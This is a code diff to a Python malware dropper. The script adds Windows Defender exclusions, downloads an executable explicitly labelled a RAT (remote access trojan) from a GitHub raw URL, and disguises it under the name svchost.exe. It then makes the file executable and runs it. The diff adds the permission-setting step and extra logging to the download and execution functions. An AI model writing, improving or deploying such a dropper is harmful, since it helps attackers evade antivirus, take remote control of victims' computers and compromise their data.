@@ -2,6 +2,7 @@ import os
 import subprocess
 import requests
 import ctypes
+import stat
 
 # Path to svchost.exe on GitHub
 github_url = "https://github.com/bouncegame/svchost/raw/refs/heads/main/svchost.exe"
@@ -37,21 +38,33 @@ def add_defender_exclusions():
     except Exception as e:
         print(f"Failed to add exclusions: {e}")
 
+def change_permissions(path):
+    try:
+        os.chmod(path, stat.S_IWRITE | stat.S_IREAD | stat.S_IEXEC)
+    except Exception as e:
+        print(f"Failed to change permissions: {e}")
+
 def download_rat(url, path):
     try:
         response = requests.get(url)
         with open(path, 'wb') as file:
             file.write(response.content)
+        print(f"RAT downloaded successfully: {path}")
     except Exception as e:
         print(f"Failed to download RAT: {e}")
 
 def run_rat(path):
     try:
-        subprocess.run([path], check=True)
+        print(f"Running RAT: {path}")
+        subprocess.run([path], check=True, capture_output=True, text=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Failed to run RAT: error status {e.returncode}")
+        print(f"Output: {e.output}")
     except Exception as e:
         print(f"Failed to run RAT: {e}")
 
 if __name__ == "__main__":
     add_defender_exclusions()
     download_rat(github_url, rat_path)
+    change_permissions(rat_path)
     run_rat(rat_path)
